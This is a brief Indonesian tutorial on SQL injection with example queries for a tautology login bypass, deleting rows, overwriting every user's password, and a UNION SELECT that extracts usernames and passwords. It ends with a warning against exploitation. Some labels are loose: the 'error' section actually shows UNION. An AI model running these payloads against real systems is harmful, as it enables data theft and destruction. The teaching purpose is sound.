Teknik SQL Injection

Berikut adalah beberapa teknik umum dalam SQL Injection:

1. Mengambil Data

Contoh untuk mengambil data dari tabel pengguna:

SELECT * FROM users WHERE username = 'admin' OR '1'='1';

Keterangan: Pernyataan ini akan selalu benar dan dapat mengekspos seluruh data pengguna.

2. Menghapus Data

Contoh untuk menghapus data pengguna:

DELETE FROM users WHERE id = '1'; --';

Keterangan: Tanda "--" mengabaikan sisa pernyataan SQL.

3. Mengubah Data

Contoh untuk mengubah data pengguna:

UPDATE users SET password = 'newpassword' WHERE username = 'admin' OR '1'='1';

Keterangan: Ini dapat mengubah semua kata sandi pengguna.

4. Memanfaatkan Error

Contoh untuk memicu pesan error:

SELECT * FROM users WHERE id = '1' UNION SELECT null, username, password FROM users; --';

Keterangan: Menggunakan UNION untuk menggabungkan hasil dari tabel lain.

Catatan Penting

SQL Injection dapat merusak aplikasi dan mencuri data. Selalu gunakan parameter yang aman dan hindari eksploitasi!
